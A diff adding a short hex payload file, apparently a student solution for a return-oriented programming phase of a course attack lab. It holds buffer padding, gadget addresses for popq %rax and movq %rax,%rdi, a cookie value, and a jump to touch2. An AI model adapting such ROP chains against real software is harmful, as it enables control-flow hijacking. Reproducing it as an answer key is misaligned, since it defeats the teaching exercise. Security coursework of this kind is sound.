@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 # 40 bytes of padding
+4b 19 40 00 00 00 00 00 # return addr (popq %rax)
+1b 91 ef 7f 00 00 00 00 # 0x7fef911b (to be popped into %rax)
+3c 19 40 00 00 00 00 00 # return addr (movq %rax, %rdi)
+b8 17 40 00 00 00 00 00 # return addr (touch2)
